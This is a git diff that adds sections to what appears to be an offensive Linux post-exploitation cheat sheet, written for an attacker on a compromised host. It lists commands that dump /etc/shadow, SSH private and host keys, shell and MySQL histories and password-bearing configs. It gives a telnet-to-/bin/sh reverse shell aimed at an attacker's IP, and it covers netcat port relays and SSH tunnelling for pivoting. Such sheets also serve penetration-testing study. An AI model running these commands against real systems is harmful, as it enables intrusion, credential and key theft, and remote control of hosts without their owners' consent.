@@ -54,5 +54,283 @@
  cat /etc/services
 ```
 
+#### Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+```
+ ps aux | grep root
+ ps -ef | grep root
+
+```
+
+#### What applications are installed? What version are they? Are they currently running?
+```
+ ls -alh /usr/bin/
+ ls -alh /sbin/
+ dpkg -l
+ rpm -qa
+ ls -alh /var/cache/apt/archivesO
+ ls -alh /var/cache/yum/
+```
+#### Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached?
+```
+cat /etc/syslog.conf
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf
+cat /etc/inetd.conf
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+
+```
+
+#### What jobs are scheduled?
+```
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+```
+
+#### Any plain text usernames and/or passwords?
+```
+ grep -i user [filename]
+ grep -i pass [filename]
+ grep -C 5 "password" [filename]
+ find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
+```
+****
+
+## Communications & Networking
+
+#### What NIC(s) does the system have? Is it connected to another network?
+```
+/sbin/ifconfig -a
+cat /etc/network/interfaces
+cat /etc/sysconfig/network
+
+```
+
+#### What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
+```
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+```
+
+#### What other users & hosts are communicating with the system?
+```
+lsof -i
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+```
+
+#### Whats cached? IP and/or MAC addresses
+```
+arp -e
+route
+/sbin/route -nee
+```
+
+#### Is packet sniffing possible? What can be seen? Listen to live traffic
+```
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
+
+```
+#### Have you got a shell? Can you interact with the system ?
+
+```
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+
+```
+#### Is port forwarding possible? Redirect and interact with traffic from another view
+##### Note: FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+``` FPipe.exe -l 80 -r 80 -s 80 192.168.1.7```
+##### Note: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+```
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+```
+##### Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe
+```
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+```
+#### Is tunnelling possible? Send commands locally, remotely
+
+```
+ssh -D 127.0.0.1:9050 -N [username]@[ip]
+proxychains ifconfig
+
+```
+*****
+
+## Confidential Information & Users
+#### Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
+```
+id
+who
+w
+last
+cat /etc/passwd | cut -d: -f1    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
+sudo -l
+```
+#### What sensitive files can be found?
+```
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+```
+
+##### Anything "interesting" in the home directorie(s)? If it's possible to access
+```
+ls -ahlR /root/
+ls -ahlR /home/
+```
+
+#### Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
+```
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD
+cat /root/anaconda-ks.cfg
+```
+#### What has the user being doing? Is there any password in plain text? What have they been edting?
+```
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history
+cat ~/.php_history
+```
+#### What user information can be found?
+```
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
+
+```
+#### Can private-key information be found?
+```
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+```
+*****
+## File Systems
+##### Which configuration files can be written in /etc/? Able to reconfigure a service?
+``` 
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+
+find /etc/ -readable -type f 2>/dev/null               # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+
+```
+#### What can be found in /var/ ?
+```
+ls -alh /var/log
+ls -alh /var/mail
+ls -alh /var/spool
+ls -alh /var/spool/lpd
+ls -alh /var/lib/pgsql
+ls -alh /var/lib/mysql
+cat /var/lib/dhcp3/dhclient.leases
+```
+#### Any settings/files (hidden) on website? Any settings file with database information?
+```
+ls -alhR /var/www/
+ls -alhR /srv/www/htdocs/
+ls -alhR /usr/local/www/apache22/data/
+ls -alhR /opt/lampp/htdocs/
+ls -alhR /var/www/html/
+```
+#### Is there anything in the log file(s) (Could help with "Local File Includes"!)
+```
+cat /etc/httpd/logs/access_log
+cat /etc/httpd/logs/access.log
+cat /etc/httpd/logs/error_log
+cat /etc/httpd/logs/error.log
+cat /var/log/apache2/access_log
+cat /var/log/apache2/access.log
+cat /var/log/apache2/error_log
+cat /var/log/apache2/error.log
+cat /var/log/apache/access_log
+cat /var/log/apache/access.log
+cat /var/log/auth.log
+cat /var/log/chttp.log
+cat /var/log/cups/error_log
+cat /var/log/dpkg.log
+cat /var/log/faillog
+cat /var/log/httpd/access_log
+cat /var/log/httpd/access.log
+cat /var/log/httpd/error_log
+cat /var/log/httpd/error.log
+cat /var/log/lastlog
+cat /var/log/lighttpd/access.log
+cat /var/log/lighttpd/error.log
+cat /var/log/lighttpd/lighttpd.access.log
+cat /var/log/lighttpd/lighttpd.error.log
+cat /var/log/messages
+cat /var/log/secure
+cat /var/log/syslog
+cat /var/log/wtmp
+cat /var/log/xferlog
+cat /var/log/yum.log
+cat /var/run/utmp
+cat /var/webmin/miniserv.log
+cat /var/www/logs/access_log
+cat /var/www/logs/access.log
+ls -alh /var/lib/dhcp3/
+ls -alh /var/log/postgresql/
+ls -alh /var/log/proftpd/
+ls -alh /var/log/samba/
+
+Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
+```
+
+
+
 
 
